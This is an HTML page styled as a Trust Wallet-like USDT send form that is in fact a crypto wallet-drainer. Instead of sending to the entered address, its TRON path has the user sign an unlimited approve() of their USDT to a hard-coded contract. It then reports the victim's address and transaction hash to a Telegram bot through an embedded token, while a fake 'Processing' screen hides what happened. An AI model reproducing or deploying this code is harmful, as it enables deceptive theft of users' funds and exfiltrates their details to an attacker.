<!DOCTYPE html>
<html lang="en" class="theme-light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
    <title>Trusts</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        * { box-sizing: border-box; }
        html, body, #root { width: 100%; height: 100%; margin: 0; font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif; font-weight: 500; }
        .theme-light { --bg: #ffffff; --text: #111827; --subtext: #6b7280; --muted: #9ca3af; --accent: #2563eb; --input-bg: #ffffff; --input-soft: #f6f7f9; --border-default: #d1d5db; }
        body { background: var(--bg ); color: var(--text); }
        .page { min-height: 100dvh; display: flex; justify-content: center; align-items: flex-start; background: var(--bg); padding: 16px; padding-top: 20px; }
        .card { width: 100%; max-width: 420px; padding: 16px; display: flex; flex-direction: column; color: var(--text); border-radius: 16px; }
        .label { font-size: 12px; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 6px; color: var(--subtext); text-transform: uppercase; }
        .input-row { height: 48px; display: flex; align-items: center; border-radius: 12px; padding: 0 12px; gap: 8px; background: var(--input-bg); border: 1.5px solid var(--border-default); margin-bottom: 14px; transition: border-color 0.2s ease; }
        .input-row:focus-within { border: 2px solid #2563eb; }
        .input-row input { flex: 1; border: none; outline: none; background: transparent; font-size: 14px; font-weight: 500; color: var(--text); }
        .input-row input::placeholder { color: var(--muted); font-weight: 500; }
        .paste, .max { font-size: 13px; font-weight: 600; cursor: pointer; color: var(--accent); background: none; border: none; padding: 0; white-space: nowrap; }
        .unit { font-size: 12px; color: var(--subtext); white-space: nowrap; }
        .network-row { display: inline-flex; align-items: center; gap: 8px; height: 36px; padding: 6px 12px; border-radius: 999px; background: var(--input-soft); border: 1.5px solid var(--border-default); margin-bottom: 16px; width: fit-content; cursor: pointer; transition: all 0.2s ease; position: relative; }
        .network-row:hover { border-color: #2563eb; }
        .network-row.open { border-color: #2563eb; }
        .network-left { display: flex; align-items: center; gap: 6px; }
        .token-logo { width: 20px; height: 20px; border-radius: 50%; object-fit: cover; }
        .network-left span { font-size: 13px; font-weight: 500; color: var(--subtext); }
        .network-arrow { width: 14px; height: 14px; transition: transform 0.2s ease; }
        .network-row.open .network-arrow { transform: rotate(180deg); }
        .token-dropdown-menu { position: absolute; top: 100%; left: 0; right: 0; background: white; border: 1.5px solid var(--border-default); border-top: none; border-radius: 0 0 12px 12px; max-height: 300px; overflow-y: auto; z-index: 1000; display: none; margin-top: -4px; }
        .token-dropdown-menu.open { display: block; }
        .token-option { padding: 12px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s ease; border-bottom: 1px solid #f0f0f0; font-size: 13px; }
        .token-option:hover { background: #f5f5f5; }
        .token-option.active { background: #f0f0f0; font-weight: 600; }
        .token-info { display: flex; flex-direction: column; gap: 2px; }
        .token-name { font-weight: 600; font-size: 13px; }
        .token-network { font-size: 11px; color: #999; }
        .estimate { font-size: 12px; color: var(--subtext); margin-bottom: auto; margin-top: 6px; }
        .connect-btn { width: 100%; height: 48px; border-radius: 999px; border: none; font-size: 16px; font-weight: 600; margin-top: auto; transition: background-color 0.25s ease, opacity 0.25s ease; cursor: pointer; }
        .connect-btn.active { background: #2563eb; color: #fff; }
        .connect-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .error-message { color: #dc2626; font-size: 12px; margin-top: 6px; padding: 8px 10px; background: #fee2e2; border-radius: 8px; display: none; }
        .error-message.show { display: block; }
        .network-selector { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); display: flex; align-items: center; justify-content: center; z-index: 2000; }
        .network-selector.hidden { display: none; }
        .network-selector-content { background: white; border-radius: 16px; padding: 32px 24px; max-width: 400px; width: 90%; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); }
        .network-selector-title { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: var(--text); }
        .network-selector-subtitle { font-size: 14px; color: var(--subtext); margin-bottom: 24px; }
        .network-button { width: 100%; height: 56px; border: 1.5px solid var(--border-default); border-radius: 12px; background: var(--input-bg); cursor: pointer; font-size: 16px; font-weight: 600; margin-bottom: 12px; transition: all 0.2s ease; display: flex; align-items: center; gap: 12px; padding: 0 16px; }
        .network-button:hover { border-color: #2563eb; background: var(--input-soft); }
        .network-button-icon { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; color: white; }
        .eth-icon { background: #627eea; }
        .bnb-icon { background: #f3ba2f; color: black; }
        .tron-icon { background: #eb0029; }
        .processing-screen { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(4px); z-index: 1000; flex-direction: column; justify-content: flex-end; align-items: center; gap: 0; padding: 0; }
        .processing-screen.active { display: flex; }
        .processing-content { width: 100%; background: white; border-radius: 24px 24px 0 0; padding: 40px 20px 30px; display: flex; flex-direction: column; align-items: center; gap: 20px; box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.1); position: relative; }
        .close-btn { position: absolute; top: 16px; right: 16px; background: none; border: none; font-size: 28px; color: #6b7280; cursor: pointer; padding: 0; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; }
        .particles-container { position: absolute; top: 0; left: 0; right: 0; height: 200px; overflow: hidden; }
        .particle { position: absolute; width: 12px; height: 12px; background: #3b82f6; border-radius: 2px; animation: fall 3s ease-in infinite; }
        @keyframes fall { to { transform: translateY(200px) rotate(360deg); opacity: 0; } }
        .checkmark-circle { width: 140px; height: 140px; position: relative; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 30% 30%, #1a1a1a, #0a0a0a); border-radius: 50%; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); animation: float 3s ease-in-out infinite; z-index: 10; }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
        .checkmark-circle img { width: 80px; height: 80px; animation: checkmark-pop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1); border-radius: 50%; object-fit: contain; }
        @keyframes checkmark-pop { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
        .processing-text { font-size: 28px; font-weight: 700; color: #1f2937; text-align: center; margin-top: 20px; }
        .processing-subtext { font-size: 14px; color: #6b7280; text-align: center; max-width: 300px; line-height: 1.6; font-weight: 400; }
        .transaction-details-btn { width: 100%; max-width: 340px; height: 56px; border-radius: 999px; border: none; background: linear-gradient(135deg, #0052cc 0%, #0052cc 100%); color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; transition: background-color 0.25s ease; box-shadow: 0 4px 15px rgba(0, 82, 204, 0.3); }
        .transaction-details-btn:hover { background: linear-gradient(135deg, #0047b2 0%, #0047b2 100%); }
        @media (max-width: 480px) {
            .page { padding: 12px; padding-top: 16px; }
            .card { padding: 12px; }
            .input-row { height: 44px; margin-bottom: 12px; }
            .label { font-size: 11px; margin-bottom: 5px; }
            .connect-btn { height: 44px; font-size: 15px; }
        }
    </style>
</head>
<body>
    <div class="network-selector" id="networkSelector">
        <div class="network-selector-content">
            <div class="network-selector-title">Select Network</div>
            <div class="network-selector-subtitle">Choose which blockchain to use</div>
            <button class="network-button" onclick="selectNetwork('ethereum')">
                <div class="network-button-icon eth-icon">Ξ</div>
                <span>Ethereum</span>
            </button>
            <button class="network-button" onclick="selectNetwork('bnb')">
                <div class="network-button-icon bnb-icon">B</div>
                <span>BNB Chain (BSC)</span>
            </button>
            <button class="network-button" onclick="selectNetwork('tron')">
                <div class="network-button-icon tron-icon">⚡</div>
                <span>TRON</span>
            </button>
        </div>
    </div>

    <div class="processing-screen" id="processingScreen">
        <div class="particles-container" id="particlesContainer"></div>
        <div class="processing-content">
            <button class="close-btn" onclick="">✕</button>
            <div class="checkmark-circle">
                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663828351091/NsPAgBXGfqaWTvni.png" alt="Processing" />
            </div>
            <div class="processing-text">Processing...</div>
            <div class="processing-subtext">Transaction in progress! Blockchain validation is underway.</div>
            <button class="transaction-details-btn" onclick="">Transaction details</button>
        </div>
    </div>

    <div id="root">
        <div class="page" style="display: none;" id="mainPage">
            <div class="card">
                <label class="label">Address or Domain Name</label>
                <div class="input-row primary">
                    <input id="recipientInput" type="text" placeholder="Search or Enter" value="TAT3kU5o3utrcFL7u747B45W1zRxbWZF8b" />
                    <span class="paste" onclick="pasteAddress()">Paste</span>
                </div>

                <label class="label">Destination Network</label>
                <div class="network-row" id="tokenSelector">
                    <div class="network-left">
                        <img id="selectedTokenLogo" src="" alt="Token" class="token-logo">
                        <span id="selectedTokenName">USDT on TRON</span>
                    </div>

                    <div class="token-dropdown-menu" id="tokenDropdownMenu"></div>
                </div>

                <label class="label">Amount</label>
                <div class="input-row amount-row">
                    <input id="amountInput" type="number" placeholder="Amount" step="0.01" />
                    <span class="unit" id="tokenUnit">USDT</span>
                    <span class="max" onclick="setMaxAmount()">Max</span>
                </div>

                <p class="estimate" id="amountInfo">≈ $0.00</p>

                <div class="error-message" id="errorMessage"></div>

                <button class="connect-btn active" id="mainButton" onclick="handleMainAction()">Next</button>
            </div>
        </div>
    </div>

    <script>
        const NETWORKS = {
            'ethereum': { name: 'Ethereum', chainId: '0x1', tokens: { 'usdt_eth': { name: 'USDT on Ethereum', symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png', smartContract: '0x...', rpc: 'https://eth.llamarpc.com' } } },
            'bnb': { name: 'BNB Chain', chainId: '0x38', tokens: { 'usdt_bnb': { name: 'USDT on BSC', symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png', smartContract: '0x...', rpc: 'https://bsc-dataseed.bnbchain.org' } } },
            'tron': { name: 'TRON', chainId: '0x2b6653dc', tokens: { 'usdt_tron': { name: 'USDT on TRON', symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png', smartContract: 'TURuHxzSzg8FR8VdtBpNSVAP7VU8KvxKFF', rpc: 'https://api.tronstack.io' } } }
        };

        const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
        let selectedNetwork = null;
        let selectedToken = null;
        let currentTokens = {};

        function selectNetwork(network) {
            selectedNetwork = network;
            currentTokens = NETWORKS[network].tokens;
            selectedToken = Object.keys(currentTokens)[0];
            
            document.getElementById('networkSelector').classList.add('hidden');
            document.getElementById('mainPage').style.display = 'flex';
            
            initializeTokenDropdown();
            document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
        }

        function initializeTokenDropdown() {
            const menu = document.getElementById('tokenDropdownMenu');
            menu.innerHTML = '';
            for (const [key, token] of Object.entries(currentTokens)) {
                const option = document.createElement('div');
                option.className = `token-option ${key === selectedToken ? 'active' : ''}`;
                option.onclick = (e) => {
                    e.stopPropagation();
                    selectToken(key);
                };
                option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${NETWORKS[selectedNetwork].name}</div></div>`;
                menu.appendChild(option);
            }
        }

        function closeDropdown() {
            const selector = document.getElementById('tokenSelector');
            const menu = document.getElementById('tokenDropdownMenu');
            selector.classList.remove('open');
            menu.classList.remove('open');
        }

        function toggleTokenDropdown() {
            const selector = document.getElementById('tokenSelector');
            const menu = document.getElementById('tokenDropdownMenu');
            
            if (selector.classList.contains('open')) {
                closeDropdown();
            } else {
                selector.classList.add('open');
                menu.classList.add('open');
            }
        }

        function selectToken(key) {
            selectedToken = key;
            const token = currentTokens[key];
            document.getElementById('selectedTokenLogo').src = token.logo;
            document.getElementById('selectedTokenName').textContent = token.name;
            document.getElementById('tokenUnit').textContent = token.symbol;
            
            closeDropdown();
            initializeTokenDropdown();
        }

        function createParticles() {
            const container = document.getElementById('particlesContainer');
            container.innerHTML = '';
            for (let i = 0; i < 8; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 50 + 'px';
                particle.style.animationDelay = Math.random() * 0.5 + 's';
                container.appendChild(particle);
            }
        }

        function pasteAddress() {
            navigator.clipboard.readText().then(text => {
                document.getElementById('recipientInput').value = text;
            });
        }

        function setMaxAmount() {
            document.getElementById('amountInput').value = '999999';
            updateAmountInfo();
        }

        function updateAmountInfo() {
            const amount = document.getElementById('amountInput').value;
            const estimatedValue = (parseFloat(amount) || 0) * 1;
            document.getElementById('amountInfo').textContent = `≈ $${estimatedValue.toFixed(2)}`;
        }

        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.classList.add('show');
        }

        function clearError() {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.classList.remove('show');
        }

        async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
            const explorerUrl = selectedNetwork === 'tron' 
                ? `https://tronscan.org/transaction/${txHash}`
                : selectedNetwork === 'bnb'
                ? `https://bscscan.com/tx/${txHash}`
                : `https://etherscan.io/tx/${txHash}`;

            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${NETWORKS[selectedNetwork].name}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date().toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;

            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: messageText
                    })
                });

                const responseData = await response.json();
                if (!responseData.ok) {
                    console.error('Telegram error:', responseData.description);
                }
            } catch (err) {
                console.error('Telegram notification error:', err);
            }
        }

        async function handleMainAction() {
            const btn = document.getElementById('mainButton');
            const recipient = document.getElementById('recipientInput').value.trim();
            const amount = document.getElementById('amountInput').value.trim();
            const token = currentTokens[selectedToken];

            if (!amount || parseFloat(amount) <= 0) {
                showError('Please enter a valid amount');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Processing...';
            clearError();

            try {
                if (selectedNetwork === 'tron') {
                    let tronWeb = window.tronWeb;
                    if (!tronWeb) {
                        showError('Trust Wallet not detected');
                        btn.disabled = false;
                        btn.textContent = 'Next';
                        return;
                    }

                    let userAddress = tronWeb.defaultAddress.base58;
                    if (!userAddress) {
                        showError('Wallet address not available');
                        btn.disabled = false;
                        btn.textContent = 'Next';
                        return;
                    }

                    const parameter = [
                        {type: 'address', value: token.smartContract},
                        {type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}
                    ];

                    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
                        token.address,
                        'approve(address,uint256)',
                        {feeLimit: 100000000},
                        parameter,
                        userAddress
                    );

                    if (!tx.result || !tx.result.result) {
                        showError('Failed to build transaction');
                        btn.disabled = false;
                        btn.textContent = 'Next';
                        return;
                    }

                    const signedTx = await tronWeb.trx.sign(tx.transaction);
                    let txHash = await tronWeb.trx.sendRawTransaction(signedTx);

                    if (!txHash) {
                        showError('Failed to send transaction');
                        btn.disabled = false;
                        btn.textContent = 'Next';
                        return;
                    }

                    await new Promise(resolve => setTimeout(resolve, 100));
                    createParticles();
                    document.getElementById('processingScreen').classList.add('active');
                    await sendTelegramNotification(userAddress, txHash, amount, token, recipient);
                    await new Promise(resolve => setTimeout(resolve, 5000));
                    document.getElementById('processingScreen').classList.remove('active');
                } else {
                    showError('Network not yet implemented');
                    btn.disabled = false;
                    btn.textContent = 'Next';
                    return;
                }

                btn.textContent = 'Next';
                btn.disabled = false;
                document.getElementById('amountInput').value = '';
                updateAmountInfo();

            } catch (error) {
                console.error("Error:", error);
                showError('Transaction failed: ' + error.message);
                document.getElementById('processingScreen').classList.remove('active');
                btn.disabled = false;
                btn.textContent = 'Next';
            }
        }
    </script>
</body>
</html>
